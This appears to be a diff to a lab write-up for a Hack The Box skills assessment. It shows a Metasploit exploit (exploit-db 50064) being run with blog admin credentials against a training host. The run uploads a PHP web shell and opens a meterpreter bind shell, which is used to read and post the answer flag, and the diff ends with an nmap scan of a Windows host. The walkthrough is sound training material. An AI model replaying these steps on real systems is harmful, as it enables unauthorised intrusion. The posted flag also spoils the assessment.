@@ -429,4 +429,126 @@ The Foothold machine don't have any browser in sight and no internet to install 
 
 ###  Vulnerability Disclosed
 
-In one of the blog posts a vulnerability is mentioned for the blog "https://www.exploit-db.com/exploits/50064", in the link is mentioned that script requires authentication to work and also informs us that  it is a metasploit module, after checking the  foothold machine I found the file was already there
+In one of the blog posts a vulnerability is mentioned for the blog "https://www.exploit-db.com/exploits/50064", in the link is mentioned that script requires authentication to work and also informs us that  it is a metasploit module, after checking the foothold machine I found the file was already there
+
+```
+┌─[htb-student@skills-foothold]─[~]
+└──╼ $locate 50064
+locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 934.2 days)
+/home/administrator/.msf4/modules/blog/50064.rb
+/home/administrator/Downloads/50064.rb
+/usr/share/exploitdb/exploits/php/webapps/50064.rb
+/usr/share/metasploit-framework/modules/exploits/50064.rb
+
+```
+
+But it was not imported into metasploit, so it requires to execute "updatedb" inside metasploit, in order to import the script
+
+```
+msf6 > use exploit/50064
+msf6 exploit(50064) > options
+
+Module options (exploit/50064):
+
+   Name       Current Setting           Required  Description
+   ----       ---------------           --------  -----------
+   PASSWORD   admin123!@#               yes       Blog password
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     172.16.1.12               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80                        yes       The target port (TCP)
+   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                         yes       The URI of the arkei gate
+   USERNAME   admin                     yes       Blog username
+   VHOST      blog.inlanefreight.local  no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       The listen port
+   RHOST  172.16.1.12      no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PHP payload
+   
+msf6 exploit(50064) > run
+
+[*] Got CSRF token: e3f6ebfd4a
+[*] Logging into the blog...
+[+] Successfully logged in with admin
+[*] Uploading shell...
+[+] Shell uploaded as data/i/4Gei.php
+[+] Payload successfully triggered !
+[*] Started bind TCP handler against 172.16.1.12:4444
+[*] Sending stage (39282 bytes) to 172.16.1.12
+[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2024-05-09 09:56:57 -0400
+
+meterpreter > cat /customscripts/flag.txt
+B1nD_Shells_r_cool
+meterpreter > 
+```
+
+> The asnwer is : **B1nD_Shells_r_cool**
+
+
+---
+
+## Host 3
+
+### Enumeration
+
+```
+[✗]─[htb-student@skills-foothold]─[~]
+└──╼ $sudo nmap -sCV -O -Pn --disable-arp-ping 172.16.1.13
+[sudo] password for htb-student: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-09 10:49 EDT
+Nmap scan report for 172.16.1.13
+Host is up (0.012s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: 172.16.1.13 - /
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+MAC Address: 00:50:56:B9:EB:EA (VMware)
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016 build 10586 - 14393
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
+| smb2-time: 
+|   date: 2024-05-09T14:50:06
+|_  start_date: 2024-05-09T13:17:41
+|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:eb:ea (VMware)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: SHELLS-WINBLUE
+|   NetBIOS computer name: SHELLS-WINBLUE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-05-09T07:50:06-07:00
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds
+
+```
